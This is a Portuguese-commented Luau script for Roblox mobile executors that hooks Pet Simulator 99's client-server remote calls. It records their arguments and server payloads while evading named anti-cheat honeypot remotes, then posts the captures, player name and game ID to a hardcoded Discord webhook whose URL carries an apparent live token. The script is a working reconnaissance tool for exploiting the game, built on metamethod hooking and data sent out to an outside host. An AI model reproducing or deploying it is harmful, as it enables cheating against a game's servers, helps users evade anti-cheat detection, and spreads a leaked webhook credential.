--!strict
--[[
    PS99 Remote Argument Capture - Recon Passivo (Discord) v1.0
    Plataforma: Executor Mobile (Delta/Hydrogen/Arceus X/Fluxus Mobile)

    O que faz (RECON - NAO dispara NADA):
      [1] Hook de __namecall -> captura FireServer/InvokeServer que o PROPRio
          jogo faz (direcao client->server). Revela os argumentos reais.
      [2] OnClientEvent/OnClientInvoke -> captura o que o SERVIDOR envia
          (direcao server->client). Revela o formato dos payloads.
      [3] Filtra por lista de INTERESSE e ignora HONEYPOTS (AdminAbuse etc).
      [4] Identifica o script do jogo que dispara cada remote.
      [5] Envia payloads formatados para o Discord em lote.

    SEGURANCA:
      - Nenhuma FireServer/InvokeServer e feito por este script.
      - Hooks so OBSERVAM e repassam o resultado original.
      - Remotes de honeypot (AdminAbuse/Admin/FFlags) sao ignorados.
      - Conta de teste recomendada: o jogo pode logar hooks.

    CONFIG:
      INTEREST  -> padroes de nome dos remotes a observar
      HONEYPOTS -> padroes a IGNORAR (nunca logar)
      FLUSH_EVERY -> numero de capturas por envio ao Discord
]]

--//==============================[ CONFIG ]==============================//--
local WEBHOOK_URL = "https://discord.com/api/webhooks/1398723880369131631/7knZsAymoHblk9BcsXYuI7XT2-8PNHkZJfFbtyLHssHqjW_pXeBQVznZ0lDHz7G9ObRI"
local WEBHOOK_NAME = "PS99 Capture"
local FLUSH_EVERY = 15          -- capturas por lote
local FLUSH_SECONDS = 30        -- flush maximo por tempo (segundos)
local MAX_CAPTURE_CHARS = 1600  -- cap por captura

-- Remotes de INTERESSE (substring do nome) - categorias verde/amarela do dump
local INTEREST = {
    "AutoFarm", "AutoHatch", "AutoDice", "Eggs_", "Pets_", "Farming_",
    "FishingEvent", "Enchants_", "Rebirth_", "Auction", "Box", "DailyRewards",
    "Ranks_", "EventGoals", "Login Streaks", "ForeverPacks", "Claim",
    "ChargedHatch", "BoothSlot", "Guilds_", "Leagues_", "Instancing_",
}

-- HONEYPOTS: nunca logar nem observar (nomes deliberados de armadilha)
local HONEYPOTS = {
    "AdminAbuse", "Run Admin Command", "ExecuteAdminAbuse", "Get BIG Admin",
    "FFlags", "AdminToolbar", "EnterInstanceAdminCommand",
}

--//==============================[ 1. API COMPAT ]==============================//--
local getExecutorName = (function()
    local fn = identifyexecutor or identify_executor
    if fn then
        local ok, name = pcall(fn)
        if ok and type(name) == "string" then return name end
    end
    return "unknown"
end)()

local copy = (function()
    if setclipboard then return setclipboard end
    if toclipboard then return toclipboard end
    if set_clipboard then return set_clipboard end
    return function() end
end)()

local saveFile = (function()
    if not writefile then return nil end
    local ok = pcall(function() makefolder("PS99Capture") end)
    return function(name, content)
        pcall(writefile, "PS99Capture/" .. name, content)
    end
end)()

local reqFn = (function()
    if syn and syn.request then return syn.request end
    if request then return request end
    if http and http.request then return http.request end
    return nil
end)()

local makeClosure = (function()
    if newcclosure then return newcclosure end
    return function(f) return f end
end)()

local hookMM = (function()
    if hookmetamethod then return hookmetamethod end
    return function() return function(...) return ... end end
end)()

local logBuffer = {}
local function logMsg(msg)
    msg = tostring(msg)
    table.insert(logBuffer, msg)
    if #logBuffer > 200 then table.remove(logBuffer, 1) end
    pcall(print, "[PS99Capture] " .. msg)
end

local function safeGame()
    local ok, g = pcall(function() return game end)
    return ok and g or nil
end

local function safeGetService(serviceName)
    local g = safeGame()
    if not g then return nil end
    local ok, svc = pcall(function() return g:GetService(serviceName) end)
    return ok and svc or nil
end

local function safeLocalPlayer()
    local players = safeGetService("Players")
    if not players then return nil end
    local ok, plr = pcall(function() return players.LocalPlayer end)
    return ok and plr or nil
end

--//==============================[ 2. WEBHOOK ]==============================//--
local function jsonString(s)
    s = tostring(s)
    s = s:gsub("\\", "\\\\"):gsub("\"", "\\\""):gsub("\n", "\\n"):gsub("\r", "\\r"):gsub("\t", "\\t")
    s = s:gsub("[%z\1-\31]", function(c) return string.format("\\u%04x", c:byte()) end)
    return "\"" .. s .. "\""
end

local function sendSimple(content, username)
    if not reqFn then return -1 end
    local body = '{"content":' .. jsonString(content) .. ',"username":' .. jsonString(username or WEBHOOK_NAME) .. '}'
    local ok, res = pcall(function()
        return reqFn({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body,
        })
    end)
    if ok and res then return tonumber(res.StatusCode) or 0 else return -1 end
end

local function sendChunked(text, label)
    local okCount = 0
    local remaining = tostring(text)
    local first = true
    while #remaining > 0 do
        local part = remaining:sub(1, 1800)
        local header = first and ("**" .. label .. "**\n") or ""
        local code = sendSimple(header .. "```\n" .. part .. "\n```")
        if code >= 200 and code < 300 then okCount = okCount + 1 end
        remaining = remaining:sub(1801)
        first = false
        task.wait(0.4)
    end
    return okCount
end

--//==============================[ 3. SERIALIZADOR SEGURO ]==============================//--
-- FIX: gsub retorna 2 valores -> NUNCA usar em return direto nem em table.insert
local function sanitize(v)
    local s = tostring(v)
    s = s:gsub("[\r\n]", " ")
    return s
end

local function serialize(value, depth, seen)
    depth = depth or 0
    seen = seen or {}
    local t = type(value)
    if t == "string" then
        return string.format("%q", sanitize(value))
    elseif t == "number" then
        return tostring(value)
    elseif t == "boolean" then
        return tostring(value)
    elseif t == "nil" then
        return "nil"
    elseif t == "function" then
        return "<function>"
    elseif t == "userdata" then
        -- Instancias Roblox: mostrar ClassName + Name, nada mais
        local ok, cls = pcall(function() return value.ClassName end)
        if ok and cls then
            local okName, nm = pcall(function() return value.Name end)
            return "<" .. tostring(cls) .. ":" .. tostring(okName and nm or "?") .. ">"
        end
        return "<userdata>"
    elseif t == "thread" then
        return "<thread>"
    elseif t == "table" then
        if seen[value] then return "<circular>" end
        seen[value] = true
        if depth > 5 then return "{...}" end
        local parts = {}
        local count = 0
        for k, v in pairs(value) do
            count = count + 1
            if count <= 40 then
                parts[#parts + 1] = "[" .. sanitize(k) .. "]=" .. serialize(v, depth + 1, seen)
            end
        end
        if count > 40 then
            parts[#parts + 1] = "...(+truncado)"
        end
        seen[value] = nil
        return "{" .. table.concat(parts, ", ") .. "}"
    end
    return tostring(value)
end

local function captureText(remoteName, direction, args)
    local parts = { "[" .. direction .. "] " .. tostring(remoteName) }
    if direction == "C->S" then
        local src = "?"
        local ok, info = pcall(debug.info, 3, "s")
        if ok and info then src = tostring(info) end
        parts[#parts + 1] = "script=" .. sanitize(src)
    end
    for i = 1, #args do
        local text = serialize(args[i])
        if #text > MAX_CAPTURE_CHARS then
            text = text:sub(1, MAX_CAPTURE_CHARS) .. "...(cap)"
        end
        parts[#parts + 1] = "arg" .. tostring(i) .. "=" .. text
    end
    return table.concat(parts, "\n")
end

--//==============================[ 4. CAPTURA + FLUSH ]==============================//--
local captures = {}
local captureCount = 0
local lastFlush = os.clock()
-- contadores globais do script (declarados ANTES de flushCaptures usá-los)
local totalLogged = 0
local interestCount = 0
local honeypotCount = 0

local function addCapture(line)
    captures[#captures + 1] = line
    captureCount = captureCount + 1
end

local function flushCaptures(force)
    if #captures == 0 then return end
    local byTime = (os.clock() - lastFlush) >= FLUSH_SECONDS
    if not force and captureCount < FLUSH_EVERY and not byTime then return end

    local text = table.concat(captures, "\n\n")
    local lote = #captures
    captures = {}
    captureCount = 0
    lastFlush = os.clock()

    local header = "**PS99 Capture - Recon**\n"
        .. "Capturas: " .. tostring(lote) .. " (lote)\n"
        .. "Total: " .. tostring(totalLogged) .. " | Interesse: " .. tostring(interestCount)
        .. " | Honeypots ignorados: " .. tostring(honeypotCount)

    task.spawn(function()
        local ok1 = sendChunked(header .. "\n\n" .. text, "CAPTURAS")
        if ok1 == 0 then
            -- fallback: arquivo local
            if saveFile then
                saveFile("capture_" .. os.date("%Y%m%d_%H%M%S") .. ".txt", text)
                logMsg("Webhook falhou - salvo em PS99Capture/")
            else
                copy(text)
                logMsg("Webhook falhou - copiado pro clipboard")
            end
        end
    end)
end

--//==============================[ 5. FILTROS ]==============================//--
local function matchesAny(name, patterns)
    local lower = tostring(name):lower()
    for _, pat in ipairs(patterns) do
        if lower:find(tostring(pat):lower(), 1, true) then
            return true
        end
    end
    return false
end

local function isHoneypot(name)
    return matchesAny(name, HONEYPOTS)
end

local function isInteresting(name)
    return matchesAny(name, INTEREST)
end

--//==============================[ 6. HOOK DE __NAMECALL (client->server) ]==============================//--
local hookedNamecall = false
local function installNamecallHook()
    local old = hookMM(game, "__namecall", makeClosure(function(self, ...)
        -- captura varargs ANTES de qualquer pcall (closures internas nao
        -- recebem o '...' do escopo pai)
        local extra = { select(2, ...) }
        local methodOk, method = pcall(getnamecallmethod)
        local obs = false
        local name = "?"
        if methodOk then
            local m = tostring(method)
            if m == "FireServer" or m == "InvokeServer" then
                if typeof(self) == "Instance" then
                    local clsOk, cls = pcall(function() return self.ClassName end)
                    local nmOk, nm = pcall(function() return self.Name end)
                    if clsOk and cls and (cls == "RemoteEvent" or cls == "RemoteFunction" or cls == "UnreliableRemoteEvent") then
                        obs = true
                        name = tostring(nmOk and nm or "?")
                    end
                end
            end
        end
        if obs then
            if not isHoneypot(name) and isInteresting(name) then
                addCapture(captureText(name, "C->S", extra))
                interestCount = interestCount + 1
                flushCaptures(false)
            else
                honeypotCount = honeypotCount + 1
            end
        end
        return old(self, ...)
    end))
    hookedNamecall = old ~= nil
    logMsg("Hook __namecall instalado: " .. tostring(hookedNamecall))
end

--//==============================[ 7. HOOKS DE EVENTOS (server->client) ]==============================//--
-- dedupe por INSTANCIA (nao por nome): se o remote for recriado apos
-- teleporte, a nova instancia e hookada no proximo scanAndHook()
local hookedInstances = {}
local hookedEvents = 0

local function hookRemote(remote)
    if hookedInstances[remote] then return end
    hookedInstances[remote] = true
    local name = tostring(remote.Name)
    local cls = tostring(remote.ClassName)

    if cls == "RemoteEvent" or cls == "UnreliableRemoteEvent" then
        local ok, conn = pcall(function()
            return remote.OnClientEvent:Connect(function(...)
                local args = { ... }
                addCapture(captureText(name, "S->C", args))
                totalLogged = totalLogged + 1
                flushCaptures(false)
            end)
        end)
        if ok and conn then hookedEvents = hookedEvents + 1 end
    elseif cls == "RemoteFunction" then
        pcall(function()
            local orig = remote.OnClientInvoke
            remote.OnClientInvoke = function(...)
                local args = { ... }
                addCapture(captureText(name, "S->C(Invoke)", args))
                totalLogged = totalLogged + 1
                flushCaptures(false)
                if orig then return orig(...) end
                return nil
            end
            hookedEvents = hookedEvents + 1
        end)
    end
end

local function scanAndHook()
    local rs = safeGetService("ReplicatedStorage")
    if not rs then return end
    local ok, list = pcall(function() return rs:GetDescendants() end)
    if not ok or not list then return end
    for i = 1, #list do
        local inst = list[i]
        local okProc = pcall(function()
            local cls = inst.ClassName
            if cls == "RemoteEvent" or cls == "RemoteFunction" or cls == "UnreliableRemoteEvent" then
                if isInteresting(inst.Name) and not isHoneypot(inst.Name) then
                    hookRemote(inst)
                end
            end
        end)
        if not okProc then
            honeypotCount = honeypotCount + 1
        end
    end
    logMsg("Hooks de eventos instalados: " .. tostring(hookedEvents))
end

-- re-varre periodicamente (remotes podem ser recriados apos teleporte)
local function hookLoop()
    while true do
        task.wait(45)
        scanAndHook()
        flushCaptures(true)
    end
end

--//==============================[ 8. UI MINIMALISTA ]==============================//--
local Players = safeGetService("Players")
local TweenService = safeGetService("TweenService")

local function makeUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "PS99Capture"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 999
    gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

    local bg = Instance.new("Frame")
    bg.AnchorPoint = Vector2.new(0.5, 0.5)
    bg.Position = UDim2.new(0.5, 0, 0.5, 0)
    bg.Size = UDim2.new(0, 360, 0, 300)
    bg.BackgroundColor3 = Color3.fromRGB(15, 17, 25)
    bg.BackgroundTransparency = 0.05
    bg.BorderSizePixel = 0
    bg.Parent = gui
    pcall(function()
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 14)
        corner.Parent = bg
    end)

    local title = Instance.new("TextLabel")
    title.BackgroundTransparency = 1
    title.Position = UDim2.new(0, 0, 0, 10)
    title.Size = UDim2.new(1, 0, 0, 36)
    title.Font = Enum.Font.GothamBold
    title.Text = "PS99 REMOTE CAPTURE"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 18
    title.Parent = bg

    local status = Instance.new("TextLabel")
    status.BackgroundTransparency = 1
    status.Position = UDim2.new(0, 12, 0, 52)
    status.Size = UDim2.new(1, -24, 0, 60)
    status.Font = Enum.Font.Gotham
    status.Text = "Recon passivo ativo...\nCapturando payloads C->S e S->C"
    status.TextColor3 = Color3.fromRGB(80, 230, 120)
    status.TextSize = 13
    status.TextWrapped = true
    status.Parent = bg

    local stats = Instance.new("TextLabel")
    stats.BackgroundTransparency = 1
    stats.Position = UDim2.new(0, 12, 0, 118)
    stats.Size = UDim2.new(1, -24, 0, 90)
    stats.Font = Enum.Font.Code
    stats.Text = "Capturas: 0\nHooks: 0\nFlush: aguardando..."
    stats.TextColor3 = Color3.fromRGB(200, 210, 230)
    stats.TextSize = 13
    stats.TextXAlignment = Enum.TextXAlignment.Left
    stats.TextYAlignment = Enum.TextYAlignment.Top
    stats.Parent = bg

    local flushBtn = Instance.new("TextButton")
    flushBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    flushBtn.Position = UDim2.new(0, 12, 1, -56)
    flushBtn.Size = UDim2.new(1, -24, 0, 44)
    flushBtn.Font = Enum.Font.GothamBold
    flushBtn.Text = "FLUSH AGORA"
    flushBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    flushBtn.TextSize = 15
    flushBtn.Parent = bg
    pcall(function()
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 10)
        corner.Parent = flushBtn
    end)
    flushBtn.Activated:Connect(function()
        flushCaptures(true)
        status.Text = "Flush forcado enviado!"
    end)

    return {
        gui = gui,
        status = status,
        stats = stats,
        setStatus = function(text, color)
            status.Text = text
            if color then status.TextColor3 = color end
        end,
        setStats = function(capturas, hooks)
            stats.Text = "Capturas: " .. tostring(capturas)
                .. "\nHooks de evento: " .. tostring(hooks)
                .. "\nInteresse: " .. tostring(interestCount)
                .. "\nHoneypots ignorados: " .. tostring(honeypotCount)
        end,
    }
end

local ui = (function()
    local ok, u = pcall(makeUI)
    if ok and u then return u end
    logMsg("Falha ao criar UI (" .. tostring(u) .. ") - modo headless")
    return {
        gui = nil,
        status = { Text = "headless" },
        stats = { Text = "" },
        setStatus = function(text) logMsg("[status] " .. tostring(text)) end,
        setStats = function() end,
    }
end)()

--//==============================[ 9. MAIN ]==============================//--
local function notifyError(msg, trace)
    if not reqFn then return "request nao suportado" end
    local player = safeLocalPlayer()
    local g = safeGame()
    local info = "**ERRO no PS99 Capture**\n```\n"
        .. tostring(msg):sub(1, 800) .. "\n```\n**Stack:**\n```\n"
        .. tostring(trace or "n/a"):sub(1, 900) .. "\n```\n"
        .. "GameId: " .. tostring(g and g.GameId or "?")
        .. "\nPlayer: " .. tostring(player and player.Name or "?")
        .. "\nExecutor: " .. getExecutorName
    local code = sendSimple(info, WEBHOOK_NAME .. " [ERRO]")
    return "codigo " .. tostring(code)
end

local function sendTestPing()
    if not reqFn then
        logMsg("WEBHOOK: request nao suportado - ping SKIPPED")
        return
    end
    local player = safeLocalPlayer()
    local g = safeGame()
    local code = sendSimple(
        "**PS99 Capture - TESTE**\nRecon passivo iniciado.\n"
        .. "GameId: " .. tostring(g and g.GameId or "?")
        .. "\nPlayer: " .. tostring(player and player.Name or "?")
        .. "\nExecutor: " .. getExecutorName
        .. "\nTask: " .. tostring(task ~= nil),
        WEBHOOK_NAME .. " [TESTE]"
    )
    logMsg("Ping de teste: codigo " .. tostring(code))
end

local function rootErrorHandler(err)
    logMsg("ERRO RAIZ: " .. tostring(err))
    local ok, trace = pcall(debug.traceback, tostring(err), 2)
    if not ok then trace = "sem traceback" end
    pcall(function()
        ui.setStatus("ERRO: " .. tostring(err), Color3.fromRGB(255, 80, 80))
    end)
    pcall(notifyError, err, trace)
    return nil
end

local function safeSpawn(fn)
    local run = function()
        xpcall(fn, function(err)
            rootErrorHandler(err)
            return nil
        end)
    end
    if task and task.spawn then
        task.spawn(run)
    else
        run()
    end
end

local function statsLoop()
    while true do
        task.wait(5)
        ui.setStats(#captures, hookedEvents)
    end
end

local function mainFlow()
    sendTestPing()
    installNamecallHook()
    scanAndHook()
    ui.setStatus("Recon passivo ativo!\nJogue normal: eggs, hatch, farm, auction...", Color3.fromRGB(80, 230, 120))
    task.spawn(hookLoop)
    task.spawn(statsLoop)
    -- flush final garantido (loop mantem vivo)
    while true do
        task.wait(FLUSH_SECONDS)
        flushCaptures(true)
    end
end

safeSpawn(mainFlow)
